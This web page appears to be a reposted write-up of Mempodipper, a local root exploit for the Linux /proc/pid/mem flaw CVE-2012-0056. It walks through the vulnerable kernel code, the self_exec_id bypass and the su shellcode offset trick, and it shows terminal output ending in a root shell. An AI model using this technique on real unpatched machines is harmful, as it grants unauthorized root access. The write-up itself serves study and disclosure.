<!doctype html>
<html lang="en-us">
    <!---what???  wtf??--->
  <head>
    <title>CVE-2012-0056: Mempodipper, a linux local root exploit.</title>
    <link rel="shortcut icon" href="/img/index.png" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.68.3" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="i9ject0r" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.css" />

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-211014781-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-211014781-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2012-0056: Mempodipper, a linux local root exploit."/>
<meta name="twitter:description" content="CVE-2012-0056: Mempodipper, a linux local root exploit."/>

    <meta property="og:title" content="CVE-2012-0056: Mempodipper, a linux local root exploit." />
<meta property="og:description" content="CVE-2012-0056: Mempodipper, a linux local root exploit." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://i9ject0r.github.io" />
<meta property="article:published_time" content="2021-02-16T21:53:31-04:00" />
<meta property="article:modified_time" content="2021-02-16T21:53:31-04:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://i9ject0r.github.io"><img class="app-header-avatar" src="/img/i9ject0r.jpg" alt="i9ject0r" /></a>
      <h1>i9ject0r</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/blog/">Blog</a>
          <3
      </nav>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://www.github.com/i9ject0r" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/barel_m4" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
          <a href="https://www.linkedin.com/in/" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">CVE-2012-0056: Mempodipper, a linux local root exploit.</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Feb 16, 2022
        </div>
      </div>
    </header>
    <div class="post-content">
<h2>Linux Local Privilege Escalation via SUID /proc/pid/mem Write</h2>
<h3>Mempodipper</h3>
<p>Introducing Mempodipper, an exploit for CVE-2012-0056. /proc/pid/mem is an interface for reading and writing, directly, process memory by seeking around with the same addresses as the process's virtual memory space. In 2.6.39, the protections against unauthorized access to /proc/pid/mem were deemed sufficient, and so the prior #ifdef that prevented write support for writing to arbitrary process memory was removed. Anyone with the correct permissions could write to process memory. It turns out, of course, that the permissions checking was done poorly. This means that all Linux kernels >=2.6.39 are vulnerable, up until the fix commit for it a couple days ago. Let's take the old kernel code step by step and learn what's the matter with it.</p>
<br><p>When /proc/pid/mem is opened, this kernel code is called:</p>
<pre><code>static int mem_open(struct inode* inode, struct file* file)
    {
        file->private_data = (void*)((long)current->self_exec_id);
        /* OK to pass negative loff_t, we can catch out-of-range */
        file->f_mode |= FMODE_UNSIGNED_OFFSET;
        return 0;
    }
    </code></pre>
<p>There are no restrictions on opening; anyone can open the /proc/pid/mem fd for any process (subject to the ordinary VFS restrictions). It simply makes note of the original process's self_exec_id that it was opened with and stores this away for checking later during reads and writes.</p>
<br><p>Writes (and reads), however, have permissions checking restrictions. Let's take a look at the write function:</p>
<pre><code>static ssize_t mem_write(struct file * file, const char __user *buf,
    size_t count, loff_t *ppos)
{

/* unimportant code removed for blog post */

struct task_struct *task = get_proc_task(file->f_path.dentry->d_inode);

/* unimportant code removed for blog post */

mm = check_mem_permission(task);
copied = PTR_ERR(mm);
if (IS_ERR(mm))
goto out_free;

/* unimportant code removed for blog post */

if (file->private_data != (void *)((long)current->self_exec_id))
goto out_mm;

/* unimportant code removed for blog post
* (the function here goes onto write the buffer into the memory)
*/
</code></pre>
<p>So there are two relevant checks in place to prevent against unauthorized writes: check_mem_permission and self_exec_id. Let's do the first one first and second one second.</p>
<br><p>The code of check_mem_permission simply calls into __check_mem_permission, so here's the code of that:</p>
<pre><code>static struct mm_struct *__check_mem_permission(struct task_struct *task)
    {
        struct mm_struct *mm;
    
        mm = get_task_mm(task);
        if (!mm)
            return ERR_PTR(-EINVAL);
    
        /*
         * A task can always look at itself, in case it chooses
         * to use system calls instead of load instructions.
         */
        if (task == current)
            return mm;
    
        /*
         * If current is actively ptrace'ing, and would also be
         * permitted to freshly attach with ptrace now, permit it.
         */
        if (task_is_stopped_or_traced(task)) {
            int match;
            rcu_read_lock();
            match = (ptrace_parent(task) == current);
            rcu_read_unlock();
            if (match && ptrace_may_access(task, PTRACE_MODE_ATTACH))
                return mm;
        }
    
        /*
         * No one else is allowed.
         */
        mmput(mm);
        return ERR_PTR(-EPERM);
    }
    </code></pre>
<p>There are two ways that the memory write is authorized. Either task == current, meaning that the process being written to is the process writing, or current (the process writing) has esoteric ptrace-level permissions to play with task (the process being written to). Maybe you think you can trick the ptrace code? It's tempting. But I don't know. Let's instead figure out how we can make a process write arbitrary memory to itself, so that task == current.</p>
<br><p>Now naturally, we want to write into the memory of suid processes, since then we can get root. Take a look at this:</p>
<pre><code>$ su "yeeeee haw I am a cowboy"
Unknown id: yeeeee haw I am a cowboy
    </code></pre>
<p>su will spit out whatever text you want onto stderr, prefixed by "Unknown id:". So, we can open a fd to /proc/self/mem, lseek to the right place in memory for writing (more on that later), use dup2 to couple together stderr and the mem fd, and then exec to su $shellcode to write an shell spawner to the process memory, and then we have root. Really? Not so easy.</p>
<br><p>Here the other restriction comes into play. After it passes the task == current test, it then checks to see if the current self_exec_id matches the self_exec_id that the fd was opened with. What on earth is self_exec_id? It's only referenced a few places in the kernel. The most important one happens to be inside of exec:</p>
<pre><code>void setup_new_exec(struct linux_binprm * bprm)
    {
    /* massive amounts of code trimmed for the purpose of this blog post */
    
        /* An exec changes our domain. We are no longer part of the thread
           group */
    
        current->self_exec_id++;
    
        flush_signal_handlers(current, 0);
        flush_old_files(current->files);
    }
    EXPORT_SYMBOL(setup_new_exec);
    </code></pre>
<p>self_exec_id is incremented each time a process execs. So in this case, it functions so that you can't open the fd in a non-suid process, dup2, and then exec to a suid process... which is exactly what we were trying to do above. Pretty clever way of deterring our attack, eh?</p>
<br><p>Here's how to get around it. We fork a child, and inside of that child, we exec to a new process. The initial child fork has a self_exec_id equal to its parent. When we exec to a new process, self_exec_id increments by one. Meanwhile, the parent itself is busy execing to our shellcode writing su process, so its self_exec_id gets incremented to the same value. So what we do is -- we make this child fork and exec to a new process, and inside of that new process, we open up a fd to /proc/parent-pid/mem using the pid of the parent process, not our own process (as was the case prior). We can open the fd like this because there is no permissions checking for a mere open. When it is opened, its self_exec_id has already incremented to the right value that the parent's self_exec_id will be when we exec to su. So finally, we pass our opened fd from the child process back to the parent process (using some very black unix domain sockets magic), do our dup2ing, and exec into su with the shell code.</p>
<br><p>There is one remaining objection. Where do we write to? We have to lseek to the proper memory location before writing, and ASLR randomizes processes address spaces making it impossible to know where to write to. Should we spend time working on more cleverness to figure out how to read process memory, and then carry out a search? No. Check this out:</p>
<pre><code>$ readelf -h /bin/su | grep Type
    Type:                              EXEC (Executable file)</code></pre>
<p>This means that su does not have a relocatable .text section (otherwise it would spit out "DYN" instead of "EXEC"). It turns out that su on the vast majority of distros is not compiled with PIE, disabling ASLR for the .text section of the binary! So we've chosen su wisely. The offsets in memory will always be the same. So to find the right place to write to, let's check out the assembly surrounding the printing of the "Unknown id: blabla" error message.</p>
<br><p>It gets the error string here:</p>
<pre><code>    403677:       ba 05 00 00 00          mov    $0x5,%edx
    40367c:       be ff 64 40 00          mov    $0x4064ff,%esi
    403681:       31 ff                   xor    %edi,%edi
    403683:       e8 e0 ed ff ff          callq  402468 (dcgettext@plt)</code></pre>
<p>And then writes it to stderr:</p>
<pre><code>    403688:       48 8b 3d 59 51 20 00    mov    0x205159(%rip),%rdi        # 6087e8 (stderr)
    40368f:       48 89 c2                mov    %rax,%rdx
    403692:       b9 20 88 60 00          mov    $0x608820,%ecx
    403697:       be 01 00 00 00          mov    $0x1,%esi
    40369c:       31 c0                   xor    %eax,%eax
    40369e:       e8 75 ea ff ff          callq  402118 (__fprintf_chk@plt)</code></pre>
<p>Closes the log:</p>
<pre><code>    4036a3:       e8 f0 eb ff ff          callq  402298 (closelog@plt)</code></pre>
<p>And then exits the program:</p>
<pre><code>    4036a8:       bf 01 00 00 00          mov    $0x1,%edi
    4036ad:       e8 c6 ea ff ff          callq  402178 (exit@plt)</code></pre>
<p>We therefore want to use 0x402178, which is the exit function it calls. We can, in an exploit, automate the finding of the exit@plt symbol with a simple bash one-liner:</p>
<pre><code>$ objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\([^0]*\)/0x\1/'
 0x402178</code></pre>
<p>So naturally, we want to write to 0x402178 minus the number of letters in the string "Unknown id: ", so that our shellcode is placed at exactly the right place.</p>
<br><p>The shellcode should be simple and standard. It sets the uid and gid to 0 and execs into a shell. If we want to be clever, we can reopen stderr by, prior to dup2ing the memory fd to stderr, we choose another fd to dup stderr to, and then in the shellcode, we dup2 that other fd back to stderr.</p>
<br><p>In the end, the exploit works like a charm with total reliability:</p>
<pre><code>    CVE-2012-0056 $ ls
    build-and-run-exploit.sh  build-and-run-shellcode.sh  mempodipper.c  shellcode-32.s  shellcode-64.s
    CVE-2012-0056 $ gcc mempodipper.c -o mempodipper
    CVE-2012-0056 $ ./mempodipper 
    ===============================
    =          Mempodipper        =
    =           by zx2c4          =
    =         Jan 21, 2012        =
    ===============================
    
    [+] Waiting for transferred fd in parent.
    [+] Executing child from child fork.
    [+] Opening parent mem /proc/6454/mem in child.
    [+] Sending fd 3 to parent.
    [+] Received fd at 5.
    [+] Assigning fd 5 to stderr.
    [+] Reading su for exit@plt.
    [+] Resolved exit@plt to 0x402178.
    [+] Seeking to offset 0x40216c.
    [+] Executing su with shellcode.
    sh-4.2# whoami
    root
    sh-4.2#</code></pre>
<p>You can watch a video of it in action.</p>
<p><iframe width="420" height="345" src="/video/CVE-2012-0056.mp4" frameborder="0" allowfullscreen=""></iframe></p>











    </div>
</article>
</main>
</body>
</html>
